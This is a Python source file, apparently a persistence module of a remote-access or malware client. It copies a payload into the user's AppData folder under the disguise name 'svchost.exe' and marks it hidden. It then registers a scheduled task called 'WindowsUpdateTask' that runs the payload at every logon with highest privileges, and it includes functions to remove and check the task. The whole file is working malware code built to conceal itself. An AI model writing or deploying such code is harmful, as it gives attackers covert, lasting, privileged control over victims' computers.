import os
import subprocess

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class ScheduledTaskPersistence(PersistenceMethod):
    name = 'scheduled_task'

    def install(self, task_name: str = 'WindowsUpdateTask', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            appdata = os.environ.get('appdata', os.path.expanduser('~'))
            file_location = os.path.join(appdata, payload_name)

            _copy_payload(file_location)
            self._hide_file(file_location)

            result = subprocess.run(
                f'schtasks /create /tn "{task_name}" /tr "{file_location}" '
                f'/sc ONLOGON /rl HIGHEST /f /del 0',
                shell=True, capture_output=True, text=True, timeout=15,
            )

            if result.returncode != 0:
                return PersistenceResult(
                    False, 'scheduled_task',
                    f'[-] Scheduled task failed: {result.stderr.strip()}',
                    file_location
                )

            verified = self._verify_task(task_name)
            if not verified:
                return PersistenceResult(
                    False, 'scheduled_task',
                    '[-] Scheduled task not found after creation',
                    file_location
                )

            return PersistenceResult(
                True, 'scheduled_task',
                f'[+] Scheduled task persistence installed: {task_name}',
                file_location,
                'Trigger: ONLOGON, RunLevel: HIGHEST'
            )
        except Exception as e:
            return PersistenceResult(False, 'scheduled_task', f'[-] Scheduled task error: {str(e)}')

    def remove(self, task_name: str = 'WindowsUpdateTask', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            subprocess.run(
                f'schtasks /delete /tn "{task_name}" /f',
                shell=True, capture_output=True, timeout=10,
            )
            try:
                appdata = os.environ.get('appdata', os.path.expanduser('~'))
                os.remove(os.path.join(appdata, payload_name))
            except Exception:
                pass
            return PersistenceResult(True, 'scheduled_task', f'[+] Scheduled task removed: {task_name}')
        except Exception as e:
            return PersistenceResult(False, 'scheduled_task', f'[-] Scheduled task remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            result = subprocess.run(
                'schtasks /query /fo LIST /v',
                shell=True, capture_output=True, text=True, timeout=15,
            )
            return PersistenceResult(True, 'scheduled_task', f'[*] Task list:\n{result.stdout[:500]}')
        except Exception:
            return PersistenceResult(False, 'scheduled_task', '[-] Scheduled task check failed')

    def _hide_file(self, path: str):
        try:
            subprocess.run(f'attrib +h "{path}"', shell=True, capture_output=True)
        except Exception:
            pass

    def _verify_task(self, task_name: str) -> bool:
        try:
            result = subprocess.run(
                f'schtasks /query /tn "{task_name}"',
                shell=True, capture_output=True, text=True, timeout=5,
            )
            return task_name.lower() in result.stdout.lower()
        except Exception:
            return False
